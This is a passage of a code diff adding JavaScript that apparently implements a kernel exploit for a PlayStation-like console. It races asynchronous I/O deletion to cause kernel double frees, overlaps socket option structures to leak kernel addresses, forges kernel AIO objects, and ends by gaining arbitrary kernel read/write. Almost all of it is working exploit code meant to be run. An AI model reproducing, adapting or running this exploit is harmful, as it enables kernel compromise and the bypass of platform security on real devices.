+          if (fn.setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, 4) === -1) {
+            throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
+          }
+
+          ipv6_socks.push(sock);
+        }
+
+        overwritten = true;
+
+        logger.debug(`Found pktopts twins after ${i} iterations !!`);
+
+        break;
+      }
+    }
+
+    if (overwritten) break;
+  }
+
+  mem.free(tclass_addr);
+  mem.free(tclass_len_addr);
+
+  if (!overwritten) {
+    throw new Error("Unable to make pktopts twins !!");
+  }
+}
+
+function init() {
+  logger.info("Environment init started...");
+
+  pin_to_core(MAIN_CORE);
+  set_rtprio(RTP);
+
+  // Prepare spray/leak rthdr0
+  spray_rthdr0_addr = mem.alloc(0x100);
+  spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, 0x80);
+
+  leak_rthdr0_addr = mem.alloc(0x800);
+
+  // Prepare reqs
+  const aio_rw_req_buf = mem.alloc(SceKernelAioRWRequest.sizeof * AIO_MAX_NUM);
+  reqs1 = SceKernelAioRWRequest.new(aio_rw_req_buf);
+
+  make_karw_pipe();
+
+  const pair_addr = mem.alloc(8);
+
+  // Create socket pair
+  if (fn.socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr) === -1) {
+    throw new SyscallError("Unable to create socket pair !!");
+  }
+
+  block_ss[0] = arw.view(pair_addr).getInt32(0, true);
+  block_ss[1] = arw.view(pair_addr).getInt32(4, true);
+
+  logger.debug(`block_ss: ${block_ss}`);
+
+  mem.free(pair_addr);
+
+  // Setup sockets for spraying and initialize pktopts
+  for (let i = 0; i < ipv6_socks.length; i++) {
+    ipv6_socks[i] = make_socket(AF_INET6, SOCK_DGRAM);
+  }
+
+  logger.info("Environment init completed !!");
+}
+
+function cleanup() {
+  logger.info("Environment cleanup started...");
+
+  for (const sock of block_ss) {
+    if (sock === 0) {
+      continue;
+    }
+
+    if (fn.close.invoke(sock) === -1) {
+      throw new SyscallError(`Unable to close fd ${sock} !!`);
+    }
+  }
+
+  if (spray_ids.some((v) => v !== 0)) {
+    process_aio(AIO_OP_POLL | AIO_OP_DELETE, spray_ids);
+    spray_ids.fill(0);
+  }
+
+  if (block_id !== 0) {
+    const block_ids = new Uint32Array([block_id]);
+    process_aio(AIO_OP_WAIT | AIO_OP_DELETE, block_ids);
+  }
+
+  for (const sock of ipv6_socks) {
+    if (sock === 0) {
+      continue;
+    }
+
+    if (fn.close.invoke(sock) === -1) {
+      throw new SyscallError(`Unable to close fd ${sock} !!`);
+    }
+  }
+
+  for (const sock of pktopts_twins) {
+    if (sock === 0) {
+      continue;
+    }
+
+    if (fn.close.invoke(sock) === -1) {
+      throw new SyscallError(`Unable to close fd ${sock} !!`);
+    }
+  }
+
+  for (const sock of rthdr_twins) {
+    if (sock === 0) {
+      continue;
+    }
+
+    if (fn.close.invoke(sock) === -1) {
+      throw new SyscallError(`Unable to close fd ${sock} !!`);
+    }
+  }
+
+  free_karw_pipe();
+
+  stop_race_worker();
+
+  mem.free(spray_rthdr0_addr);
+  mem.free(leak_rthdr0_addr);
+  mem.free(reqs1.addr);
+
+  logger.info("Environment cleanup completed !!");
+}
+
+async function setup() {
+  logger.info("Environment setup started...");
+
+  logger.info(`Block AIO...`);
+
+  build_reqs1(WORKER_NUM, block_ss[0]);
+
+  spray_aio(AIO_CMD_READ, WORKER_NUM, spray_ids, 1);
+
+  block_id = spray_ids[0];
+  logger.debug(`block_id: ${block_id.hex()}`);
+
+  logger.info(`Spray AIO...`);
+
+  build_reqs1(NUM_REQS);
+
+  spray_aio(AIO_CMD_READ, NUM_REQS, spray_ids);
+
+  process_aio(AIO_OP_CANCEL, spray_ids);
+
+  await spawn_race_worker();
+
+  logger.info("Environment setup completed !!");
+}
+
+async function double_free_reqs2() {
+  const server_addr = sockaddr_in.new();
+  server_addr.sin_family = AF_INET;
+  server_addr.sin_port = 0x8d13; // 5005
+  server_addr.sin_addr = 0x0100007f; // 127.0.0.1
+
+  const server_sock = make_socket(AF_INET, SOCK_STREAM);
+  logger.debug(`server_sock: ${server_sock}`);
+
+  const optval_addr = mem.alloc(4);
+  arw.view(optval_addr).setInt32(0, 1, true);
+
+  if (fn.setsockopt.invoke(server_sock, SOL_SOCKET, SO_REUSEADDR, optval_addr, 4) === -1) {
+    throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
+  }
+
+  mem.free(optval_addr);
+
+  if (fn.bind.invoke(server_sock, server_addr.addr, sockaddr_in.sizeof) === -1) {
+    throw new SyscallError(`Unable to bind socket ${server_sock} !!`);
+  }
+
+  if (fn.listen.invoke(server_sock, 1) === -1) {
+    throw new SyscallError(`Unable to listen socket ${server_sock} !!`);
+  }
+
+  const client_linger = linger.new();
+  client_linger.l_onoff = 1;
+  client_linger.l_linger = 1;
+
+  const which_req = NUM_REQS - 1;
+  const aio_ids = new Uint32Array(NUM_REQS);
+
+  build_reqs1(NUM_REQS);
+
+  const aio_ids_offset_addr = aio_ids.buffer.data().add(which_req * Uint32Array.BYTES_PER_ELEMENT);
+  const outs_offset_addr = outs.buffer.data().add(1 * Uint32Array.BYTES_PER_ELEMENT);
+
+  let won_race = false;
+  for (let i = 0; i < ATTEMPT_NUM; i++) {
+    logger.debug(`Attempt AIO double free race...`);
+
+    const client_sock = make_socket(AF_INET, SOCK_STREAM);
+    logger.debug(`client_sock: ${client_sock}`);
+
+    if (fn.connect.invoke(client_sock, server_addr.addr, sockaddr_in.sizeof) === -1) {
+      throw new SyscallError(`Unable to connect socket ${client_sock} !!`);
+    }
+
+    const connected_sock = fn.accept.invoke(server_sock, 0, 0);
+    logger.debug(`connected_sock: ${connected_sock}`);
+    if (connected_sock === -1) {
+      throw new SyscallError(`Unable to accept socket ${server_sock} !!`);
+    }
+
+    // force soclose() to sleep
+    if (fn.setsockopt.invoke(client_sock, SOL_SOCKET, SO_LINGER, client_linger.addr, linger.sizeof) === -1) {
+      throw new SyscallError(`Unable to set socket option for fd ${client_sock} !!`);
+    }
+
+    reqs1[which_req].fd = client_sock;
+
+    spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, NUM_REQS, aio_ids);
+    process_aio(AIO_OP_CANCEL | AIO_OP_POLL, aio_ids);
+
+    logger.debug(`aio_ids: ${Array.from(aio_ids).map((v) => v.hex())}`);
+
+    // drop the reference so that aio_multi_delete() will trigger _fdrop()
+    if (fn.close.invoke(client_sock) === -1) {
+      throw new SyscallError(`Unable to close fd ${client_sock} !!`);
+    }
+
+    const race_task = race_worker.execute("aio_delete", aio_ids_offset_addr, outs_offset_addr);
+
+    process_aio(AIO_OP_POLL, aio_ids, which_req);
+
+    logger.debug(`poll_err: ${outs[0].hex()}`);
+
+    const info_addr = mem.alloc(TCP_INFO_SIZE);
+
+    const info_size_addr = mem.alloc(4);
+    arw.view(info_size_addr).setInt32(0, TCP_INFO_SIZE, true);
+
+    if (fn.getsockopt.invoke(connected_sock, IPPROTO_TCP, TCP_INFO, info_addr, info_size_addr) === -1) {
+      throw new SyscallError(`Unable to get socket option for fd ${connected_sock} !!`);
+    }
+
+    const tcp_state = arw.view(info_addr).getInt8(0);
+    logger.debug(`tcp_state: ${tcp_state}`);
+
+    mem.free(info_addr);
+    mem.free(info_size_addr);
+
+    if (outs[0] !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
+      // PANIC: double free on the 0x80 malloc zone. important kernel
+      // data may alias
+      process_aio(AIO_OP_DELETE, aio_ids, which_req);
+      won_race = true;
+    }
+
+    await race_task;
+
+    if (won_race) {
+      let verify_won_race = false;
+
+      const race_errs = outs.slice(0, 2);
+      logger.debug(`race_errs: ${Array.from(race_errs).map((v) => v.hex())}`);
+
+      // if the code has no bugs then this isn't possible but we keep the
+      // check for easier debugging
+      if (race_errs.every((v) => v === 0)) {
+        logger.info("Looking for rthdr twins...");
+
+        // RESTORE: double freed memory has been reclaimed with harmless data
+        // PANIC: 0x80 malloc zone pointers aliased
+        find_rthdr_twins();
+
+        logger.info(`Found rthdr twins: ${rthdr_twins} !!`);
+
+        logger.debug(`AIO double free achieved after ${i} iterations !!`);
+
+        logger.info(`AIO double free achieved !!`);
+
+        verify_won_race = true;
+      }
+
+      won_race = verify_won_race;
+    }
+
+    // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
+    // twice. this will leave one request undeleted
+    process_aio(AIO_OP_DELETE, aio_ids);
+
+    if (fn.close.invoke(connected_sock) === -1) {
+      throw new SyscallError(`Unable to close fd ${connected_sock} !!`);
+    }
+
+    if (won_race) {
+      stop_race_worker();
+
+      if (fn.close.invoke(server_sock) === -1) {
+        throw new SyscallError(`Unable to close fd ${server_sock} !!`);
+      }
+
+      break;
+    }
+  }
+
+  mem.free(server_addr.addr);
+  mem.free(client_linger.addr);
+
+  if (!won_race) {
+    throw new Error("AIO double free failed !!");
+  }
+}
+
+function leak_kaddrs() {
+  logger.info("Leak evf started...");
+
+  if (fn.close.invoke(rthdr_twins[1]) === -1) {
+    throw new SyscallError(`Unable to close fd ${rthdr_twins[1]} !!`);
+  }
+
+  // type confuse a struct evf with a struct ip6_rthdr. the flags of the evf
+  // must be set to >= 0xf00 in order to fully leak the contents of the rthdr
+  let leaked = false;
+  for (let i = 0; i < ATTEMPT_NUM; i++) {
+    const evfs = new Array(HANDLES_NUM);
+
+    for (let i = 0; i < evfs.length; i++) {
+      evfs[i] = fn.evf_create.invoke("", 0, (i << 0x10) | 0xf00);
+    }
+
+    get_rthdr(rthdr_twins[0], 0x80);
+
+    const marker = arw.view(leak_rthdr0_addr).getInt32(0, true);
+    const tag = marker & 0xffff;
+    const idx = marker >>> 0x10;
+    if (tag === 0xf00) {
+      evf = evfs[idx];
+
+      fn.evf_clear.invoke(evf, 0);
+      fn.evf_set.invoke(evf, marker | 1);
+
+      get_rthdr(rthdr_twins[0], 0x80);
+
+      const new_marker = arw.view(leak_rthdr0_addr).getInt32(0, true);
+      const new_tag = new_marker & 0xffff;
+      const new_idx = new_marker >>> 0x10;
+      if (new_tag === (tag | 1) && new_idx === idx) {
+        logger.debug(`evf: ${evf.hex()}`);
+
+        leaked = true;
+
+        logger.debug(`Leaked evf after ${i} iterations !!`);
+
+        evfs.splice(idx, 1);
+      }
+    }
+
+    for (const evf of evfs) {
+      fn.evf_delete.invoke(evf);
+    }
+
+    if (leaked) break;
+  }
+
+  if (!leaked) {
+    throw new Error("Unable to leak evf !!");
+  }
+
+  logger.info("Leaked evf !!");
+
+  for (let i = 0; i < 0x10; i++) {
+    logger.debug(`evf[${i}]: ${arw.view(leak_rthdr0_addr).getBInt(i * 8, true)}`);
+  }
+
+  // fields we use from evf:
+  //   struct evf:
+  //     0 u64 flags
+  //     0x28 struct cv cv
+  //     0x38 TAILQ_HEAD(struct evf_waiter) waiters
+  //
+  // evf.cv.cv_description = "evf cv"
+  // string is located at the kernel's mapped ELF file
+  evf_cv_addr = arw.view(leak_rthdr0_addr).getBInt(0x28, true);
+  logger.debug(`evf_cv_addr: ${evf_cv_addr}`);
+
+  // because of TAILQ_INIT(), we have:
+  //
+  // evf.waiters.tqh_last == &evf.waiters.tqh_first
+  //
+  // we now know the address of the kernel buffer we are leaking
+  reqs2_addr = arw.view(leak_rthdr0_addr).getBInt(0x40, true).sub(0x38);
+  logger.debug(`reqs2_addr: ${reqs2_addr}`);
+
+  // ip6_rthdr0 and evf obj are overlapped by now
+  // corrupt ip6r0_len to leak (0xFF + 1) * 8 bytes [0x800] by setting the evf's flag
+  fn.evf_clear.invoke(evf, 0);
+  fn.evf_set.invoke(evf, 0xff << 8);
+
+  // allocate reqs1 arrays at 0x100 kmalloc zone since SceKernelAioRWRequest.sizeof * 6 = 0xF0
+  const num_reqs = 6;
+  const leak_ids = new Uint32Array(HANDLES_NUM * num_reqs);
+
+  build_reqs1(num_reqs);
+
+  // use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
+  // the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket
+  // field
+  reqs1.buf = reqs2_addr.add(4);
+
+  logger.info("leak reqs2 started...");
+
+  const leak_aio_entry = aio_entry.new(leak_rthdr0_addr);
+
+  let reqs2;
+  leaked = false;
+  for (let i = 0; i < ATTEMPT_NUM; i++) {
+    spray_aio(AIO_CMD_WRITE | AIO_CMD_MULTI, num_reqs, leak_ids);
+
+    // out of bound read on adjacent malloc 0x80 memory
+    get_rthdr(rthdr_twins[0], 0x800);
+
+    for (let j = 1; j < 0x10; j++) {
+      reqs2 = leak_aio_entry[j];
+      if (verify_reqs2(reqs2)) {
+        logger.debug(`reqs2 index: ${j}`);
+
+        leaked = true;
+
+        logger.debug(`Leaked reqs2 after ${i} iterations !!`);
+
+        break;
+      }
+    }
+
+    if (leaked) break;
+
+    process_aio(AIO_OP_CANCEL | AIO_OP_POLL | AIO_OP_DELETE, leak_ids);
+  }
+
+  if (!leaked) {
+    throw new Error("Unable to leak reqs2 !!");
+  }
+
+  logger.info("Leaked reqs2 !!");
+
+  for (let i = 0; i < 0x10; i++) {
+    logger.debug(`reqs2[${i}]: ${arw.view(reqs2.addr).getBInt(i * 8, true)}`);
+  }
+
+  // reqs1 is allocated from malloc 0x100 zone, so it must be aligned at 0xff..xx00
+  reqs1_addr = reqs2.ar2_reqs1.and(new BInt(0xff).not());
+  logger.debug(`reqs1_addr: ${reqs1_addr}`);
+
+  // store for curproc leak later
+  aio_info_addr = reqs2.ar2_info;
+  logger.debug(`aio_info_addr: ${aio_info_addr}`);
+
+  logger.info("Find target_id started...");
+
+  let rest;
+  let found = false;
+  for (let batch = 0; batch < leak_ids.length; batch += num_reqs) {
+    process_aio(AIO_OP_CANCEL, leak_ids, batch, num_reqs);
+
+    // out of bound read on adjacent malloc 0x80 memory
+    get_rthdr(rthdr_twins[0], 0x800);
+
+    if (reqs2.ar2_result.state === AIO_STATE_ABORTED) {
+      target_id = leak_ids[batch];
+      logger.debug(`target_id: ${target_id.hex()}`);
+
+      leak_ids[batch] = 0;
+
+      found = true;
+
+      logger.debug(`Found target_id at batch ${batch / num_reqs} !!`);
+
+      rest = batch + num_reqs;
+      break;
+    }
+  }
+
+  if (!found) {
+    throw new Error("Unable to find target_id !!");
+  }
+
+  logger.info("Found target_id !!");
+
+  for (let i = 0; i < 0x10; i++) {
+    logger.debug(`reqs2[${i}]: ${arw.view(reqs2.addr).getBInt(i * 8, true)}`);
+  }
+
+  process_aio(AIO_OP_CANCEL, leak_ids, rest);
+  process_aio(AIO_OP_POLL | AIO_OP_DELETE, leak_ids);
+}
+
+function double_free_reqs1() {
+  const num_batches = 2;
+  const aio_ids = new Uint32Array(AIO_MAX_NUM * num_batches);
+
+  build_reqs1(AIO_MAX_NUM);
+
+  logger.info("Leak AIO queue entry started...");
+
+  fn.evf_delete.invoke(evf);
+
+  let leaked = false;
+  for (let i = 0; i < ATTEMPT_NUM; i++) {
+    spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, AIO_MAX_NUM, aio_ids);
+
+    const len = get_rthdr(rthdr_twins[0], 0x800);
+    const ar2_cmd = arw.view(leak_rthdr0_addr).getInt32(0, true);
+    if (len === 8 && ar2_cmd === AIO_CMD_READ) {
+      leaked = true;
+
+      logger.debug(`Leaked AIO queue entry after ${i} iterations !!`);
+
+      process_aio(AIO_OP_CANCEL, aio_ids);
+
+      break;
+    }
+
+    process_aio(AIO_OP_CANCEL | AIO_OP_POLL | AIO_OP_DELETE, aio_ids);
+  }
+
+  if (!leaked) {
+    throw new Error("Unable to leak AIO queue entry !!");
+  }
+
+  logger.info("Leaked AIO queue entry !!");
+
+  logger.info("Craft AIO queue entry started...");
+
+  // craft a aio_batch using the end portion of the buffer
+  const reqs3_offset = 0x28;
+  const spray_reqs3_addr = spray_rthdr0_addr.add(reqs3_offset);
+  const leak_reqs3_addr = leak_rthdr0_addr.add(reqs3_offset);
+
+  // overlap crafted reqs3 (aio_batch) with reqs2 (aio_entry)
+  const spray_aio_entry = aio_entry.new(spray_rthdr0_addr);
+
+  spray_aio_entry.ar2_ticket = 5;
+  spray_aio_entry.ar2_info = reqs1_addr;
+  spray_aio_entry.ar2_batch = reqs2_addr.add(reqs3_offset); // reqs3 offset
+
+  // use reqs1 to fake a aio_batch at offset 0x28.
+  const spray_aio_batch = aio_batch.new(spray_reqs3_addr);
+
+  spray_aio_batch.ar3_num_reqs = 1;
+  spray_aio_batch.ar3_reqs_left = 0;
+  spray_aio_batch.ar3_state = AIO_STATE_COMPLETE;
+  spray_aio_batch.ar3_done = 0;
+
+  // .ar3_lock.lock_object.lo_flags = (
+  //     LO_SLEEPABLE | LO_UPGRADABLE
+  //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
+  //     | 6 << LO_CLASSSHIFT
+  //     | LO_INITIALIZED
+  // )
+  spray_aio_batch.lock_object_flags = 0x67b0000;
+
+  // .ar3_lock.lk_lock = LK_UNLOCKED
+  spray_aio_batch.lock_object_lock = 1;
+
+  logger.info("Crafted AIO queue entry !!");
+
+  logger.info("Spray crafted AIO queue entry started...");
+
+  if (fn.close.invoke(rthdr_twins[0]) === -1) {
+    throw new SyscallError(`Unable to close fd ${rthdr_twins[0]} !!`);
+  }
+
+  rthdr_twins.fill(0);
+
+  let req_id;
+  let overwritten = false;
+  for (let i = 0; i < ATTEMPT_NUM; i++) {
+    for (const sock of ipv6_socks) {
+      set_rthdr(sock);
+    }
+
+    for (let batch = 0; batch < aio_ids.length; batch += AIO_MAX_NUM) {
+      outs.fill(-1);
+
+      process_aio(AIO_OP_CANCEL, aio_ids, batch, AIO_MAX_NUM);
+
+      const req_idx = outs.indexOf(AIO_STATE_COMPLETE);
+      if (req_idx !== -1) {
+        logger.debug(`req_idx: ${req_idx}`);
+
+        logger.debug(`Found req_idx at batch ${batch / AIO_MAX_NUM} after ${i} iterations !!`);
+
+        logger.debug(`states[${req_idx}]: ${outs[req_idx].hex()}`);
+
+        const aio_req_idx = batch + req_idx;
+
+        req_id = aio_ids[aio_req_idx];
+        logger.debug(`req_id: ${req_id.hex()}`);
+
+        // set .ar3_done to 1
+        process_aio(AIO_OP_POLL, aio_ids, aio_req_idx, 1);
+
+        logger.debug(`states[${req_idx}]: ${outs[0].hex()}`);
+
+        aio_ids[aio_req_idx] = 0;
+
+        for (let k = 0; k < ipv6_socks.length; k++) {
+          get_rthdr(ipv6_socks[k], 0x80);
+
+          const done = arw.view(leak_reqs3_addr).getUint8(0xc);
+          if (done) {
+            logger.debug(`Overwritten crafted AIO queue entry after ${i} iterations !!`);
+            overwritten = true;
+
+            rthdr_twins[0] = ipv6_socks[k];
+            logger.debug(`dirty_fd: ${rthdr_twins[0]}`);
+
+            // remove dirty from list
+            ipv6_socks.splice(k, 1);
+
+            // free rthdr from rest of sockets
+            for (let i = 0; i < ipv6_socks.length;i++) {
+              free_rthdr(ipv6_socks[i]);
+            }
+
+            // replace dirty with new sockets
+            ipv6_socks.push(make_socket(AF_INET6, SOCK_DGRAM));
+
+            break;
+          }
+        }
+      }
+
+      if (overwritten) break;
+    }
+
+    if (overwritten) break;
+  }
+
+  if (!overwritten) {
+    throw new Error("Unable to overwite crafted AIO queue entry !!");
+  }
+
+  logger.info("Overwritten crafted AIO queue entry !!");
+
+  process_aio(AIO_OP_POLL | AIO_OP_DELETE, aio_ids);
+
+  const target_ids = new Uint32Array([req_id, target_id]);
+
+  // enable deletion of target_ids
+  process_aio(AIO_OP_POLL, target_ids, 1);
+
+  const status = outs.slice(0, 2);
+  logger.debug(`target status: ${Array.from(status).map((v) => v.hex())}`);
+
+  // double free on malloc 0x100 by:
+  //   - freeing target_id's aio_object->reqs1
+  //   - freeing req_id's aio_object->aio_entries[x]->ar2_info
+  //   - ar2_info points to same addr as target_id's aio_object->reqs1
+  //
+  // PANIC: double free on the 0x100 malloc zone. important kernel data may alias
+  process_aio(AIO_OP_DELETE, target_ids);
+
+  // we reclaim first since the sanity checking here is longer which makes it
+  // more likely that we have another process claim the memory
+  try {
+    logger.info("Make pktopts twins...");
+
+    // RESTORE: double freed memory has been reclaimed with harmless data
+    // PANIC: 0x100 malloc zone pointers aliased
+    make_pktopts_twins();
+
+    logger.info(`Made pktopts twins: ${pktopts_twins} !!`);
+  } finally {
+    const errs = outs.slice(0, 2);
+
+    logger.debug(`delete errors: ${Array.from(errs).map((v) => v.hex())}`);
+
+    process_aio(AIO_OP_POLL, target_ids);
+
+    const status = outs.slice(0, 2);
+
+    logger.debug(`target status: ${Array.from(status).map((v) => v.hex())}`);
+
+    if (status[0] !== SCE_KERNEL_ERROR_ESRCH) {
+      throw new Error("Bad delete of corrupt AIO request");
+    }
+
+    if (errs.some((v) => v !== 0)) {
+      throw new Error("Bad delete of ID pair");
+    }
+  }
+}
+
+function make_karw() {
+  logger.info("Initiate kernel ARW...");
+
+  mem.bset(spray_rthdr0_addr, 0x100);
+  spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, 0x100);
+
+  const ip6po_pktinfo_addr = reqs1_addr.add(0x10);
+  logger.debug(`ip6po_pktinfo_addr: ${ip6po_pktinfo_addr}`);
+
+  arw.view(spray_rthdr0_addr).setBInt(0x10, ip6po_pktinfo_addr, true); // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
+
+  logger.info(`Overwrite ${pktopts_twins[0]} pktopts started...`);
+
+  if (fn.close.invoke(pktopts_twins[1]) === -1) {
+    throw new SyscallError(`Unable to close fd ${pktopts_twins[1]} !!`);
+  }
+
+  const tclass_addr = mem.alloc(4);
+  const tclass_len_addr = mem.alloc(4);
+
+  let overwritten = false;
+  for (let i = 0; i < ATTEMPT_NUM; i++) {
+    for (let i = 0; i < ipv6_socks.length; i++) {
+      // if a socket doesn't have a pktopts, setting the rthdr will make
+      // one. the new pktopts might reuse the memory instead of the
+      // rthdr. make sure the sockets already have a pktopts before
+      arw.view(spray_rthdr0_addr).setUint32(0xb0, (i << 0x10) | 0x1337, true);
+      set_rthdr(ipv6_socks[i]);
+    }
+
+    arw.view(tclass_len_addr).setInt32(0, 4, true);
+    if (fn.getsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, tclass_len_addr) === -1) {
+      throw new SyscallError(`Unable to get socket option for fd ${pktopts_twins[0]} !!`);
+    }
+
+    const marker = arw.view(tclass_addr).getUint32(0, true);
+    const tag = marker & 0xffff;
+    const idx = marker >>> 0x10;
+    if (tag === 0x1337) {
+      pktopts_twins[1] = ipv6_socks[idx];
+      logger.debug(`reclaim_sock: ${pktopts_twins[1]}`);
+
+      ipv6_socks.splice(idx, 1);
+
+      overwritten = true;
+
+      logger.debug(`Overwritten ${pktopts_twins[0]} pktopts after ${i} iterations !!`);
+
+      break;
+    }
+  }
+
+  mem.free(tclass_addr);
+  mem.free(tclass_len_addr);
+
+  if (!overwritten) {
+    throw new Error(`Unable to overwite ${pktopts_twins[0]} pktopts !!`);
+  }
+
+  logger.info(`Overwritten ${pktopts_twins[0]} pktopts !!`);
+
+  const pktinfo_addr = mem.alloc(0x14);
+  const nhop_addr = mem.alloc(4);
+  const buf_addr = mem.alloc(8);
+
+  function kread8(addr) {
+    if (addr.eq(0)) {
+      throw new Error("Empty addr !!");
+    }
+
+    arw.view(pktinfo_addr).setBInt(0, ip6po_pktinfo_addr, true); // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
+
+    let offset = 0;
+    while (offset < 8) {
+      arw.view(pktinfo_addr).setBInt(8, addr.add(offset), true); // pktopts.ip6po_nexthop = addr + offset
+
+      if (fn.setsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14) === -1) {
+        throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);
+      }
+
+      arw.view(nhop_addr).setInt32(0, 8 - offset, true);
+
+      if (fn.getsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_NEXTHOP, buf_addr.add(offset), nhop_addr) === -1) {
+        throw new SyscallError(`Unable to get socket option for fd ${pktopts_twins[0]} !!`);
+      }
+
+      const n = arw.view(nhop_addr).getInt32(0, true);
+      if (n === 0) {
+        arw.view(buf_addr).setUint8(offset, 0);
+        offset += 1;
+      } else {
+        offset += n;
+      }
+    }
+
+    return arw.view(buf_addr).getBInt(0, true);
+  }
+
+  kread8(evf_cv_addr);
+  const kstr = String.from(buf_addr);
+  logger.debug(`kstr: ${kstr}`);
+
+  if (kstr !== "evf cv") {
+    throw new Error(`Expected 'evf cv' got ${kstr} !!`);
+  }
+
+  kernel_base = evf_cv_addr.sub(constants.EVF_OFFSET);
+  logger.info(`kernel base: ${kernel_base}`);
+
+  const p = kread8(aio_info_addr.add(8));
+  logger.debug(`proc: ${p}`);
+
+  const mask = new BInt("0xffff000000000000");
+  if (p.and(mask).neq(mask)) {
+    throw new Error(`${p} is not valid kernel address !!`);
+  }
+
+  const p_pid = kread8(p.add(0xb0));
+  logger.debug(`p_pid: ${p_pid}`);
+
+  const pid = fn.getpid.invoke();
+  logger.debug(`pid: ${pid.hex()}`);
+
+  if (p_pid.neq(pid)) {
+    throw new Error(`Expected pid ${pid} got ${p_pid} !!`);
+  }
+
+  const p_fd = kread8(p.add(0x48));
+  logger.debug(`p_fd: ${p_fd}`);
+
+  fdt_ofiles = kread8(p_fd);
+  logger.debug(`fdt_ofiles: ${fdt_ofiles}`);
+
+  const master_pipe_fp = kread8(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
+  logger.debug(`master_pipe_fp: ${master_pipe_fp}`);
+
+  const slave_pipe_fp = kread8(fdt_ofiles.add(slave_pipe[0] * FILEDESCENT_SIZE));
+  logger.debug(`slave_pipe_fp: ${slave_pipe_fp}`);
+
+  const master_pipe_f_data = kread8(master_pipe_fp);
+  logger.debug(`master_pipe_f_data: ${master_pipe_f_data}`);
+
+  const slave_pipe_f_data = kread8(slave_pipe_fp);
+  logger.debug(`slave_pipe_f_data: ${slave_pipe_f_data}`);
+
+  mem.bset(pktinfo_addr, 0x14);
+
+  arw.view(pktinfo_addr).setBInt(0, master_pipe_f_data.add(8), true); // pktopts.ip6po_pktinfo = &((pipe *)master_pipe_fp->f_data)->pipe_buffer.out
+  arw.view(pktinfo_addr).setBInt(8, 0, true); // pktopts.ip6po_nexthop = 0
+
+  if (fn.setsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14) === -1) {
+    throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);
+  }
+
+  arw.view(pktinfo_addr).setUint32(0, 0, true); // pipebuf.out
+  arw.view(pktinfo_addr).setUint32(4, PAGE_SIZE, true); // pipebuf.size
+  arw.view(pktinfo_addr).setBInt(8, slave_pipe_f_data, true); // pipebuf.buffer
+
+  if (fn.setsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14) === -1) {
+    throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);
+  }
+
+  kv = new KernelView(master_pipe, slave_pipe);
+
+  logger.info("Achieved kernel ARW !!");
+}
+//#endregion
+//#region Structs
+const linger = new Struct("linger", [
+  { type: "Int32", name: "l_onoff" },
+  { type: "Int32", name: "l_linger" },
+]);
+
+const sockaddr_in = new Struct("sockaddr_in", [
+  { type: "Uint8", name: "sin_len" },
+  { type: "Uint8", name: "sin_family" },
+  { type: "Uint16", name: "sin_port" },
+  { type: "Uint32", name: "sin_addr" },
+  { type: "Uint8", name: "sin_zero", count: 8 },
+]);
+
+const SceKernelAioResult = new Struct("SceKernelAioResult", [
+  { type: "Int64", name: "return_value" },
+  { type: "Uint32", name: "state" },
+  { type: "Uint32", name: "_pad" },
+]);
+
+const SceKernelAioRWRequest = new Struct("SceKernelAioRWRequest", [
+  { type: "Uint64", name: "offset" },
+  { type: "Uint64", name: "nbyte" },
+  { type: "Uint64", name: "buf" },
+  { type: "SceKernelAioResult*", name: "result" },
+  { type: "Int32", name: "fd" },
+]);
+
+const aio_entry = new Struct("aio_entry", [
+  { type: "Uint32", name: "ar2_cmd" },
+  { type: "Uint32", name: "ar2_ticket" },
+  { type: "Uint8", name: "_unk1", count: 8 },
+  { type: "Uint64", name: "ar2_reqs1" },
+  { type: "Uint64", name: "ar2_info" },
+  { type: "Uint64", name: "ar2_batch" },
+  { type: "Uint64", name: "ar2_spinfo" },
+  { type: "SceKernelAioResult", name: "ar2_result" },
+  { type: "Uint64", name: "ar2_file" },
+  { type: "Uint64", name: "_unk2" },
+  { type: "Uint64", name: "ar2_qentry" },
+  { type: "Uint8", name: "_pad2", count: 0x28 },
+]);
+
+const aio_batch = new Struct("aio_batch", [
+  { type: "Uint32", name: "ar3_num_reqs" },
+  { type: "Uint32", name: "ar3_reqs_left" },
+  { type: "Uint32", name: "ar3_state" },
+  { type: "Uint32", name: "ar3_done" },
+  { type: "Uint8", name: "_unk1", count: 0x18 },
+  { type: "Uint32", name: "lock_object_flags" },
+  { type: "Uint8", name: "_unk2", count: 0x0c },
+  { type: "Uint64", name: "lock_object_lock" },
+]);
+//#endregion
